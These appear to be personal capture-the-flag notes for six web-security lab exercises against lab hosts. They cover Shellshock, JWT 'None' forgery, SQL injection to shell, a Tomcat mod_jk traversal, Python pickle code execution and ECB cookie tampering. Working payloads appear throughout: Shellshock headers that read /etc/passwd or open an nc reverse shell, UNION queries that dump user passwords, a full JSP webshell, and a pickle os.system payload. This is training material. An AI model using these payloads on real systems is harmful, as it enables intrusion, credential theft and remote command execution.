# White badge

## 01 - shelshock vuln

chl:
`/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`

url:
https://ptl-392ad7d5-0e9e0682.libcurl.so/

exploit:
- run bash commands via the User-agent on a http request
- `() { :;}; $(</etc/passwd)`
- `() { :;}; /usr/bin/nc $IP_ADDR $PORT -e /bin/bash`

notes:
- `$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80`
- `User-Agent: () { :;}; echo $(</etc/passwd)`Aaa

## 02 - vuln in jwt lib

chl:
retrieve a key

url:
http://ptl-d2babfc9-921be1b6.libcurl.so/

notes:
- JWT provides a way to validate the signature using a `None` algorithm which can be defined by a client (attacker), the signature has to be empty: `$HEADER.$PAYLOAD.`
- on this ex, the jwt is stored in cookies

## 03 - from sqli to shell

chl:
`/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`

url:
http://ptl-f99df351-3bdd4c8f.libcurl.so/

notes:
- bugs found: sqli, 
- find number of columns: `http://ptl-f99df351-3bdd4c8f.libcurl.so/cat.php?id=1 union select 1,2,3,4` or `http://ptl-f99df351-3bdd4c8f.libcurl.so/cat.php?id=1 order by 4`
- check db version: `http://ptl-f99df351-3bdd4c8f.libcurl.so/cat.php?id=1 union select 1,@@version,3,4`, also `user()`, `database()`
- list tables: `http://ptl-f99df351-3bdd4c8f.libcurl.so/cat.php?id=3 union select 1,table_name,3,4 from information_schema.tables`, also `column_name` from `.columns`
- get columns of `users` table: `http://ptl-f99df351-3bdd4c8f.libcurl.so/cat.php?id=3 union select 1,column_name,3,4 from information_schema.columns where table_name="users"`a
- getting passwords: `http://ptl-f99df351-3bdd4c8f.libcurl.so/cat.php?id=3 union select 1,concat(login,":::",password),3,4 from users`a
- after login to admin, upload a simple php shell: `http://ptl-f99df351-3bdd4c8f.libcurl.so/admin/uploads/abc.php3?cmd=whoami`

## 04 - Solving CVE-2007-1860: mod_jk double-decoding

chl:
`/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`

url:
http://ptl-b3f95ebe-a6c6c73f.libcurl.so/

notes:
- it uses tomcat 7 with CSRF protection in the manager (JSESSIONID)
- tomcat+mod_jk are vulnerable to CV-2007-1860, which allows `../` as  double url encoding `%252E%252E/%252E%252E/`

exploit:
- tomcat admin manager with default creds found: ptl-b3f95ebe-a6c6c73f.libcurl.so/examples/jsp/%252E%252E/%252E%252E/manager/html (admin:)
- in order to upload the webshell via the tomcat manager, the `form action` html has to be modified in order to upload to `/examples/jsp/%252E%252E/%252E%252E/......`
- the webshell app  can be found at http://ptl-b3f95ebe-a6c6c73f.libcurl.so/examples/jsp/%252E%252E/%252E%252E/webshell/
- upload a jsp shell

the jsp shell file
```jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

```bash
#Creating the war file
mkdir webshell; cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
```

## 05 - pickle code execution

chl:
/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509

url:
http://ptl-be2b93ba-f7795a72.libcurl.so/

notes:
- cpickle vuln works on python2 
- there is a web server waiting as input a base64 text that contains cpickle'd obj, this obj can be a shell :)

exploit:
- generate the shell obj with cpickle

```python
import os
import base64
#import _pickle as cPickle
import cPickle

class Shell(object):
    def __reduce__(self):
        return (os.system,("/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509",))

dump = cPickle.dumps(Shell())
print(base64.b64encode(dump))
```
- inject the resultant b64 output to the input service (a cookie in the app)

## 06 breaking ECB encryption

chl: get the code

url: http://ptl-25840c6c-41b00aa7.libcurl.so

notes:
- ecb works by creating blocks of code, each with a encryption key. Each block is independent and "removable"
- the enc is being applied in the cookies which are modifiable on burpsuite
